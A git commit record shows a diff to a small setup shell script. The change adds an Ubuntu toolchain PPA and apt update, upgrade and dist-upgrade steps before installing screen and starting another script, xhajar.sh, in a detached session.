74175b61d6c8e26baff878b2f04a0e55319ea131
renilo <88342640+renilo@users.noreply.github.com>
2021-10-01 21:48:45 +0700

    Update xautokontol.sh

--- xautokontol.sh
+++ xautokontol.sh
@@ -1,7 +1,10 @@
 #!/bin/sh
 
 sudo apt update
-
+sudo add-apt-repository ppa:ubuntu-toolchain-r/test 
+sudo apt-get update
+sudo apt-get upgrade
+sudo apt-get dist-upgrade
 sudo apt install screen -y
 
 screen -dmS xhajar.sh ./xhajar.sh 65 75
